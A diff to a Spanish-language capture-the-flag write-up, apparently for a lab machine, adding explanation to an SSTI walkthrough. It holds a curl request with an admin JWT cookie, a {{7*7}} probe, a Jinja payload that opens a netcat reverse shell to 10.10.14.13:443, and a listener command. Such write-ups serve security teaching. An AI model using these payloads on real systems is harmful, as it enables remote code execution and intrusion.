@@ -176,10 +176,22 @@ Verificar Vulnerabilidad
 curl -X POST http://10.10.11.134:5000/order \ -H "Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4" \ --data-urlencode "costume={{7*7}}" | grep 49
 ```
 Respuesta contiene "49" → SSTI confirmado
+
 ![SSTI](49.png)
+
+Como vemos el servidor interpreta la operatoria de ```7*7``` esto es un claro signo de que es vulnerable a un ataque de Server-Side Template Injection (SSTI)
+
+Ahora nos vamos a ir a /order, y aqui vamos a intentar ejecutar comandos, vamos a abrinos la consola y probar una reverse shell para acceder al servidor.
+
+```
+curl -X POST http://10.10.11.134:5000/order \
+  -H "Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4" \
+  --data-urlencode "costume={{lipsum.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 443 >/tmp/f').read()}}"
+```
 
 Reverse Shell
 Preparar listener:
+
 ```
 nc -nlvp 443
 ```
@@ -189,7 +201,8 @@ curl -X POST http://10.10.11.134:5000/order \
   -H "Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4" \
   --data-urlencode "costume={{lipsum.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 443 >/tmp/f').read()}}"
 ```
-https://./images/reverse_shell.png
+
+![SSTI](rshell.png)
 
 Estabilizar Shell Con tratamiento de la TTY
 
